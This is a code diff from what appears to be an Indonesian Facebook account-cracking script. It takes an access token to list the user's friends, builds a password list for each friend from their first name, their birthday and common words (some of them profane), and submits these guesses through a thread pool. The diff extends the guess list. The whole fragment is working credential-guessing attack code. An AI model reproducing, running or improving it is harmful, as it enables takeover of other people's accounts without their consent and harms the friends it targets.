@@ -168,7 +168,7 @@ class nampung:
 			print('[+] Jumlah ID teman :',len(idTeman),'\n[+] Starting crack, stop? CTRL + Z\n======================================\n')
 			for id in idTeman:
 				r2=json.loads(req.get(f'https://graph.facebook.com/{id}?access_token={self.token}').text)
-				try:pwList=[r2['first_name']+'0',r2['first_name']+'11',r2['first_name']+'12',r2['first_name']+'123',r2['first_name']+'1234',r2['first_name']+'12345','Sayang','Doraemon','Bangsad','Rahasia','Katasandi','123456','1234567','Kontol','102030','Freefire','Anjing','Monyet','Bismillah','Indonesia',r2['birthday']] #Password list ubah lah jika itu butuh :)
+				try:pwList=[r2['first_name']+'0',r2['first_name']+'11',r2['first_name']+'12',r2['first_name']+'123',r2['first_name']+'1234',r2['first_name']+'12345','Sayang','Doraemon','Bangsad','Rahasia','Katasandi','123456','1234567','Kontol','102030','Freefire','Anjing','Monyet','takutdosa','dilarangnyuri','Goblok yang nyuri','sandikamu','sandikamu123','freefire123','freefire1','cobahekakunaku','gglubang','Pwnya123','Bismillah','Indonesia',r2['birthday']] #Password list ubah lah jika itu butuh :)
 				except:pass
 				try:
 					for pw in pwList[1:19]:tokai.submit(crack(self.token).crack1,id,pw,pwList[-1])
